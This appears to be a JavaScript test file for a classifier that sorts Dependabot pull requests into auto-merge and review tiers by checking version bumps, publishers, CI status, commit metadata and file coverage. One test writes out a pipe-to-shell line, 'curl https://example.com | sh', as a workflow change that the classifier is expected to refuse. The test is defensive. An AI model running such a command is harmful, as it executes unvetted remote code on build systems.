// The tier both lanes share. The vectors are the pr-merge lane's
// (plugins/source-control/skills/babysit-prs/scripts/tests/test_babysit_dependabot.py,
// classes Classify and Content), one for one, so the two lanes sort a pull
// request the same way; the content-step and security cases are this lane's.
import assert from "node:assert/strict";
import { test } from "node:test";

import { classify, contentReason, contentStep, isMajor, isSecurityUpdate, parseConfig, usesOnly } from "./dependency-classify.mjs";

const NPM = "dependabot/npm_and_yarn/x-1.3.0";
const ACTIONS = "dependabot/github_actions/actions/checkout-4.2.0";

function metadata(...updates) {
  const lines = ["Bumps things.", "", "---", "updated-dependencies:"];
  for (const [name, kind, version] of updates) {
    lines.push(`- dependency-name: ${name}`, `  dependency-version: ${version}`, "  dependency-type: direct:production");
    if (kind !== null) lines.push(`  update-type: version-update:${kind}`);
  }
  lines.push("...", "", "Signed-off-by: dependabot[bot] <support@github.com>");
  return lines.join("\n");
}

const commit = (message, { sha = "d".repeat(40), name = "dependabot[bot]", email = "49699333+dependabot[bot]@users.noreply.github.com" } = {}) => ({
  sha,
  commit: { message, author: { name, email } },
});

const tier = (title, { body = "", ref = NPM, ci = "success", commits = [] } = {}) =>
  classify({ author: "dependabot[bot]", headRef: ref, title, body, labels: [], ciStatus: ci, commits });

test("a pull request another author opened is not classified", () => {
  assert.equal(classify({ author: "octocat", title: "bump x from 1.0.0 to 1.0.1" }), null);
});

test("a patch or 1.x minor update is auto", () => {
  for (const title of ["bump x from 1.2.3 to 1.2.4", "build(deps): bump x from 1.2.0 to 1.3.0"]) {
    const result = tier(title);
    assert.deepEqual([result.tier, result.reasons], ["auto", []], title);
  }
});

test("a quoted scoped npm name matches the title", () => {
  // Dependabot quotes `@scope/name` in the metadata (PR #7706).
  const message = metadata(['"@anthropic-ai/claude-code"', "semver-patch", "2.1.302"]);
  const result = tier("build: Bump @anthropic-ai/claude-code from 2.1.301 to 2.1.302 in the npm-minor-patch group", {
    commits: [commit(message)],
  });
  assert.deepEqual([result.tier, result.reasons], ["auto", []]);
});

test("a 0.x minor update is review", () => {
  const result = tier("Bump x from 0.3.1 to 0.4.0");
  assert.deepEqual([result.tier, result.reasons], ["review", ["major:x"]]);
  assert.equal(tier("Bump x from 0.3.1 to 0.3.2").tier, "auto");
});

test("a major update is review", () => {
  assert.deepEqual(tier("build(deps): bump x from 4.2.0 to 5.0.0").reasons, ["major:x"]);
});

test("an unreadable title or version is review", () => {
  assert.deepEqual(tier("chore: tidy").reasons, ["unparsed-updates"]);
  assert.deepEqual(tier("bump x from 0a1b2c3d4e5f to 9f8e7d6c5b4a").reasons, ["unparsed-version:x"]);
});

test("a group with one major entry is review", () => {
  const body =
    "Updates `actions/checkout` from 4.1.0 to 4.2.0\n" +
    "Updates `actions/setup-node` from 6.0.0 to 7.0.0\n" +
    "Updates `github/codeql-action` from 3.1.0 to 3.1.1\n";
  const result = tier("build: Bump the vendor-actions group across 1 directory with 3 updates", { body, ref: ACTIONS });
  assert.deepEqual(result.reasons, ["major:actions/setup-node"]);
});

test("a group whose lines do not add up is review", () => {
  assert.deepEqual(tier("bump the g group with 3 updates", { body: "Updates `a` from 1.0.0 to 1.0.1\n" }).reasons, [
    "unparsed-updates",
  ]);
});

test("an actions update from an unlisted publisher is review", () => {
  assert.equal(tier("bump actions/checkout from 4.1.0 to 4.2.0", { ref: ACTIONS }).tier, "auto");
  assert.deepEqual(tier("bump someone/action from 1.0.0 to 1.1.0", { ref: ACTIONS }).reasons, ["publisher:someone/action"]);
  assert.equal(tier("bump someone/pkg from 1.0.0 to 1.1.0").tier, "auto", "outside github_actions the publisher is not read");
});

test("a red ci-status is review and a running one is not", () => {
  for (const ci of ["action_required", "cancelled", "failure", "startup_failure", "timed_out"]) {
    assert.ok(tier("bump x from 1.0.0 to 1.0.1", { ci }).reasons.includes("ci-status-red"), ci);
  }
  assert.equal(tier("bump x from 1.0.0 to 1.0.1", { ci: "pending" }).tier, "auto");
});

test("metadata is read and must agree with the title", () => {
  const minor = commit(metadata(["x", "semver-minor", "1.3.0"]));
  assert.equal(tier("bump x from 1.2.0 to 1.3.0", { commits: [minor] }).tier, "auto");
  assert.equal(tier("bump x", { commits: [minor] }).tier, "auto", "metadata alone, when the title names nothing");
  const major = commit(metadata(["x", "semver-major", "2.0.0"]));
  assert.deepEqual(tier("bump x", { commits: [major] }).reasons, ["major:x"]);
  const result = tier("bump x from 1.9.0 to 2.0.0", { commits: [minor] });
  assert.equal(result.tier, "review");
  assert.ok(result.reasons.includes("sources-disagree"), "metadata calling a 1.x jump minor disagrees with a title reading major");
  const other = commit(metadata(["y", "semver-patch", "1.0.1"]));
  assert.ok(tier("bump x from 1.0.0 to 1.0.1", { commits: [other] }).reasons.includes("sources-disagree"));
});

test("a 0.x minor in the metadata is major", () => {
  assert.deepEqual(tier("bump x", { commits: [commit(metadata(["x", "semver-minor", "0.4.0"]))] }).reasons, ["major:x"]);
  assert.deepEqual(tier("bump x", { commits: [commit(metadata(["x", null, "1.3.0"]))] }).reasons, ["unparsed-version:x"]);
});

test("real group metadata and body agree", () => {
  const message = metadata(
    ["actions/create-github-app-token", "semver-minor", "3.3.0"],
    ["actions/setup-node", "semver-minor", "7.1.0"],
    ["anthropics/claude-code-action", "semver-patch", "1.0.248"],
  );
  const body =
    "Updates `actions/create-github-app-token` from 3.2.0 to 3.3.0\n" +
    "Updates `actions/setup-node` from 7.0.0 to 7.1.0\n" +
    "Updates `anthropics/claude-code-action` from 1.0.247 to 1.0.248\n";
  const result = tier("build: Bump the vendor-actions group across 1 directory with 3 updates", {
    body,
    ref: ACTIONS,
    commits: [commit(message)],
  });
  assert.deepEqual([result.tier, result.updates.length], ["auto", 3]);
});

test("metadata from a commit another author wrote is not read", () => {
  const forged = commit(metadata(["x", "semver-patch", "2.0.0"]), { name: "someone", email: "someone@example.test" });
  assert.deepEqual(tier("bump x from 1.0.0 to 2.0.0", { commits: [forged] }).reasons, ["major:x"]);
});

test("major means the first numeric component changed, or the second below 1.0", () => {
  assert.equal(isMajor("1.9.9", "2.0.0"), true);
  assert.equal(isMajor("0.2.0", "0.3.0"), true);
  assert.equal(isMajor("0.2.0", "0.2.9"), false);
  assert.equal(isMajor("v6", "v7"), true);
  assert.equal(isMajor("4.1", "4.2.0-rc.1"), false);
  assert.equal(isMajor("main", "4.2.0"), null);
});

test("a security update is the security label or an advisory in the body", () => {
  assert.equal(isSecurityUpdate({ labels: ["Security"], body: "" }), true);
  assert.equal(isSecurityUpdate({ labels: [], body: "Fixes GHSA-abcd-1234-wxyz." }), true);
  assert.equal(isSecurityUpdate({ labels: [], body: "Patches CVE-2026-12345" }), true);
  assert.equal(isSecurityUpdate({ labels: [], body: "See the security advisory." }), true);
  assert.equal(isSecurityUpdate({ labels: ["dependencies"], body: "Bumps x." }), false);
  assert.equal(classify({ author: "dependabot[bot]", title: "bump x from 1.0.0 to 1.0.1", labels: ["security"] }).security, true);
});

// Content: the pr-merge lane's Content class.
const CONFIG_PAIRS = parseConfig(
  [
    "version: 2",
    "updates:",
    "  - package-ecosystem: github-actions",
    "    directory: /",
    "    groups:",
    "      vendor-actions:",
    "        patterns:",
    "          - actions/*",
    "  - package-ecosystem: npm",
    '    directory: "/plugins/miro/server"',
    "  - package-ecosystem: pip",
    "    directories:",
    "      - /plugins/speech",
    '      - "/.github" # the CI toolchain',
    "",
  ].join("\n"),
);
const PIN =
  "@@ -10,7 +10,7 @@ jobs:\n" +
  "       - name: Check out\n" +
  `-        uses: actions/checkout@${"1".repeat(40)} # v4.1.0\n` +
  `+        uses: actions/checkout@${"2".repeat(40)} # v4.2.0\n` +
  "         with:\n";
const changed = (path, patch, previous) => ({
  filename: path,
  status: "modified",
  ...(patch === undefined ? {} : { patch }),
  ...(previous ? { previous_filename: previous } : {}),
});
const refusal = (files, extra = []) => contentReason(files, CONFIG_PAIRS, new Set(extra));

test("the config reads every ecosystem and directory", () => {
  assert.deepEqual(CONFIG_PAIRS, [
    ["github-actions", "/"],
    ["npm", "/plugins/miro/server"],
    ["pip", "/plugins/speech"],
    ["pip", "/.github"],
  ]);
  assert.equal(parseConfig("version: 2\n"), null);
});

test("a directories glob keeps * and ? in one segment", () => {
  const cases = [
    ["plugins/x/scripts/package.json", "/plugins/*/scripts", true],
    ["plugins/x/extra/scripts/package.json", "/plugins/*/scripts", false],
    ["lib-a/package.json", "/lib-*", true],
    ["lib-a/b/package.json", "/lib-*", false],
    ["lib-ab/package.json", "/lib-?b", true],
    ["lib-a/b/package.json", "/lib-?/b", true],
    ["lib-/b/package.json", "/lib-?/b", false],
    ["package.json", "**/*", true],
    ["a/b/c/package.json", "**/*", true],
    ["plugins/x/y/scripts/package.json", "/plugins/**/scripts", true],
    ["plugins/scripts/package.json", "/plugins/**/scripts", true],
    ["plugins.x/package.json", "/plugins?x", true],
    ["pluginsQx/package.json", "/plugins.x", false],
  ];
  for (const [path, directory, covered] of cases) {
    assert.equal(contentReason([changed(path)], [["npm", directory]]) === null, covered, `${path} in ${directory}`);
  }
});

test("covered manifests and lock files pass", () => {
  assert.equal(
    refusal([
      changed("plugins/miro/server/package-lock.json"),
      changed("plugins/miro/server/package.json", "@@ -1 +1 @@\n-a\n+b\n"),
      changed("plugins/speech/requirements.txt"),
      changed(".github/requirements-ci.txt"),
    ]),
    null,
  );
});

test("a manifest outside a covered directory is refused", () => {
  for (const path of ["package.json", "plugins/other/requirements.txt", "plugins/miro/server/src/package.json"]) {
    assert.equal(refusal([changed(path)]), `dependabot-content:${path}`);
  }
});

test("a non-manifest file is refused, and a rename on both sides", () => {
  assert.equal(refusal([changed("plugins/miro/server/package.json"), changed("scripts/x.sh")]), "dependabot-content:scripts/x.sh");
  assert.equal(
    refusal([changed("plugins/speech/requirements.txt", undefined, "plugins/speech/run.py")]),
    "dependabot-content:plugins/speech/run.py",
  );
});

test("a uses:-pin-only workflow diff passes", () => {
  for (const path of [".github/workflows/ci.yml", ".github/actions/setup/action.yaml"]) {
    assert.equal(refusal([changed(path, PIN)]), null, path);
  }
  assert.equal(usesOnly(PIN), true);
});

test("a workflow diff changing a run line is refused", () => {
  const patch = `${PIN}-        run: echo hi\n+        run: curl https://example.com | sh\n`;
  assert.equal(refusal([changed(".github/workflows/ci.yml", patch)]), "dependabot-content:.github/workflows/ci.yml");
  assert.notEqual(refusal([changed(".github/workflows/ci.yml")]), null, "a workflow with no patch cannot be judged");
  assert.notEqual(refusal([changed(".github/scripts/x.yml", PIN)]), null, "any other file under .github is not an action file");
});

test("paths another checked commit touched pass", () => {
  assert.equal(refusal([changed("plugins/miro/CHANGELOG.md")], ["plugins/miro/CHANGELOG.md"]), null);
});

// The content step, as the pr-merge lane's _dependabot_content.
const BUMP = commit("chore(plugins): release bump [dependabot skip]", {
  sha: "e".repeat(40),
  name: "github-actions[bot]",
  email: "41898282+github-actions[bot]@users.noreply.github.com",
});
const FIX = commit("fix: adapt [dependabot skip]", { sha: "f".repeat(40), name: "lanes", email: "lanes@example.test" });

test("the content step counts the bump commit's paths as checked", () => {
  const files = [changed("plugins/miro/server/package.json"), changed("plugins/miro/CHANGELOG.md")];
  const commitFiles = (sha) => (sha === BUMP.sha ? ["plugins/miro/CHANGELOG.md"] : null);
  assert.equal(contentStep({ commits: [commit(""), BUMP], commitFiles, files, config: CONFIG_PAIRS, changedFiles: 2 }), null);
});

test("the content step's refusals and gaps are review reasons", () => {
  const files = [changed("plugins/miro/server/package.json")];
  const base = { files, config: CONFIG_PAIRS, changedFiles: 1 };
  assert.equal(contentStep({ ...base, commits: [BUMP], commitFiles: () => null }), `dependabot-commit-files-unreadable:${"e".repeat(12)}`);
  assert.equal(contentStep({ ...base, commits: [FIX], commitFiles: () => [".github/workflows/x.yml"] }), "dependabot-fix-content:.github/workflows/x.yml");
  assert.equal(contentStep({ ...base, config: null }), "dependabot-config-unreadable");
  assert.equal(contentStep({ ...base, changedFiles: 2 }), "dependabot-content:files-incomplete");
  const result = classify({ author: "dependabot[bot]", headRef: NPM, title: "bump x from 1.0.0 to 1.0.1", ...base, files: [changed("dist/x.js")] });
  assert.deepEqual([result.tier, result.reasons], ["review", ["dependabot-content:dist/x.js"]]);
});
